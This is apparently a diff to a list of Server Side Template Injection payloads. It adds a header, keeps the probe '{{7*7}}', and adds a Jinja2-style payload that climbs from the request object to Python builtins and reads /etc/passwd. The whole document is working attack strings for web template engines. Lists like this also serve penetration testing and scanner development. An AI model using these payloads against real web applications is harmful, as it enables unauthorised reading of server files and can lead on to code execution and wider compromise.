@@ -1,1 +1,3 @@
+# Server Side Template Injection payloads
 {{7*7}}
+{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}
